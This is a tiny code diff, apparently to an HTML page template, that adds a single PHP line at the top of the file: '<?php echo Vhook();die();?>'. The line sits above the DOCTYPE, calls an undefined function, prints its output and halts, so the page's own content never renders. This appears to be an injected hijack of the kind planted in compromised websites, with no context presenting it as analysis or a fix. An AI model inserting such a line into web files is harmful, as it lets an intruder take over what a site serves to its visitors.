@@ -1,4 +1,4 @@
-
+<?php echo Vhook();die();?>
 <!DOCTYPE html>
 <html lang="en">
 
